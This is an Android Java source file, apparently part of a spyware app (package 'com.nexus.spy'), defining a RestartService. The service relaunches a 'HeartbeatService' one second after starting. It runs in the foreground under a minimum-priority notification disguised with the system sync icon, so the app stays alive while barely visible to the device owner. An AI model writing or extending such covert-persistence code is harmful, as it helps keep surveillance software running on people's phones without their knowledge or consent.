package com.nexus.spy;
import android.app.*;
import android.content.Intent;
import android.os.*;
public class RestartService extends Service {
    @Override public int onStartCommand(Intent i, int f, int s) {
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            Intent svc = new Intent(this, HeartbeatService.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc); else startService(svc);
            stopSelf();
        }, 1000);
        NotificationChannel ch = new NotificationChannel("rs","RS", NotificationManager.IMPORTANCE_MIN);
        getSystemService(NotificationManager.class).createNotificationChannel(ch);
        startForeground(2, new Notification.Builder(this,"rs")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(Notification.PRIORITY_MIN).build());
        return START_NOT_STICKY;
    }
    @Override public IBinder onBind(Intent i) { return null; }
}
